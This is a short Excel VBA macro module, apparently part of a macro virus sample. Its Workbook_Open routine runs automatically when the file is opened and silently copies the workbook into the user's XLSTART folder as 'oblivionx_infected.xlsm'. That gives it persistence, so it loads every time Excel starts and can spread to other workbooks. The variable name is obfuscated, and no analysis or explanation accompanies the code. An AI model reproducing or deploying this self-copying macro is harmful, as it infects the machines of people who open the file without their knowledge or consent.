Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim jybosg1pnivrj As String
    jybosg1pnivrj = Environ("APPDATA") & "\Microsoft\Excel\XLSTART\oblivionx_infected.xlsm"
    ThisWorkbook.SaveCopyAs jybosg1pnivrj
End Sub
